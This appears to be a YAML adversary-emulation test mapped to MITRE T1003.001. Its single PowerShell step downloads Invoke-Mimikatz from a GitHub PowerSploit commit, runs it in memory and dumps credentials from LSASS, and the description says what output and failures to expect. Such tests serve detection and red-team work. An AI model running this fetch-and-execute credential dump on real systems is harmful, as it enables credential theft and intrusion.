api_version: "2.0"
name: Powershell Mimikatz
description: "Dumps credentials from memory via Powershell by invoking a remote mimikatz script.\nIf Mimikatz runs successfully you will see several usernames and hashes output to the screen.\nCommon failures include seeing an \\\"access denied\\\" error which results when Anti-Virus blocks execution. \nOr, if you try to run the test without the required administrative privileges you will see this error near the bottom of the output to the screen \"ERROR kuhl_m_sekurlsa_acquireLSA\"\n"
args:
    - name: remote_script
      type: string
      default: https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1
uuid: 66fb0bc1-3c3f-47e9-a298-550ecfefacbc
mitre:
    tactics:
        - 'TA0006: Credential Access'
    techniques:
        - 'T1003: OS Credential Dumping'
    subtechniques:
        - 'T1003.001: LSASS Memory'
requirements:
    platforms:
        - os: windows
steps:
    - name: powershell-mimikatz
      inline: |
        IEX (New-Object Net.WebClient).DownloadString('{{.Args.remote_script}}'); Invoke-Mimikatz -DumpCreds
      executor: powershell
      cleanup:
        inline: ""
        executor: powershell
